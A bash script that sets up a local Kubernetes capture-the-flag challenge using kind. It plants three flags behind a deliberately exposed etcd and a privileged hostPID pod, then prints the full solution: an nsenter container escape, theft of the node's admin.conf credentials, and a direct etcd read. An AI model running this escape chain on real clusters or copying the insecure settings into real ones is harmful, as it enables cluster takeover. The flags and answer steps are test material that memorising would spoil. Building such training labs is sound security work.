#!/bin/bash
# Chain 10: Privileged Breakout → Node shell → etcd (3 steps)
set -euo pipefail
K8S_ID="chain10"
CLUSTER_NAME="cve-chain10-priv-etcd"
source "$(dirname "$0")/../../scripts/k8s-common.sh"
FLAG1="flag{chain10-step1-priv}"
FLAG2="flag{chain10-step2-rbac}"
FLAG3="flag{chain10-step3-etcd-final}"

echo "[Chain 10] Privilege to etcd — 3 steps"

mkdir -p /home/kianabin/cve-flags/chain10
echo "$FLAG1" > /home/kianabin/cve-flags/chain10/flag.txt

kind create cluster --name "$CLUSTER_NAME" --config - << 'KINDCFG'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
  - role: control-plane
    image: kindest/node:v1.27.3
    extraMounts:
      - hostPath: /home/kianabin/cve-flags/chain10
        containerPath: /host-flag
    kubeadmConfigPatches:
      - |
        kind: ClusterConfiguration
        etcd:
          local:
            extraArgs:
              client-cert-auth: "false"
KINDCFG

docker pull bitnami/kubectl:1.28 2>/dev/null || true
kind load docker-image bitnami/kubectl:1.28 --name "$CLUSTER_NAME" 2>/dev/null || true
kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true
sleep 10

# Step 1: privileged + hostPID pod (flag on the node, NOT mounted)
kubectl apply -f - << YAML
apiVersion: v1
kind: Pod
metadata:
  name: chain10-step1
spec:
  hostPID: true
  containers:
    - name: escape
      image: bitnami/kubectl:1.28
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
      securityContext:
        privileged: true
YAML

# Step 2 flag: kube-system secret readable only from a node shell (admin.conf)
kubectl create secret generic chain10-step2 --from-literal=flag="$FLAG2" -n kube-system 2>/dev/null || true

# Step 3 final flag: written into the REAL etcd under a custom key
# (invisible to the Kubernetes API -> no kubectl shortcut)
k8s_put_etcd_key "/chain10-final" "$FLAG3"

kubectl wait --for=condition=Ready pod/chain10-step1 --timeout=60s 2>/dev/null || true
sleep 5

echo ""
echo "[Chain 10] Ready"
echo "    Step 1: kubectl exec chain10-step1 -- nsenter --target 1 --mount -- cat /host-flag/flag.txt"
echo "    Step 2: copy kubectl into the host and use admin.conf:"
echo "       kubectl exec chain10-step1 -- sh -c 'cp /opt/bitnami/kubectl/bin/kubectl /proc/1/root/usr/local/bin/kubectl'"
echo "       kubectl exec chain10-step1 -- nsenter --target 1 --mount --net -- sh -c \\"
echo "         'KUBECONFIG=/etc/kubernetes/admin.conf kubectl get secret chain10-step2 -n kube-system -o jsonpath={.data.flag} | base64 -d'"
echo "    Step 3: from the node shell read the custom etcd key (install curl if missing):"
echo "       kubectl exec chain10-step1 -- nsenter --target 1 --mount --net -- sh -c \\"
echo "         'curl -sk -X POST https://127.0.0.1:2379/v3/kv/range -H \"Content-Type: application/json\" -d \"{\\\"key\\\":\\\"$(printf /chain10-final | base64 -w0)\\\"}\"'"
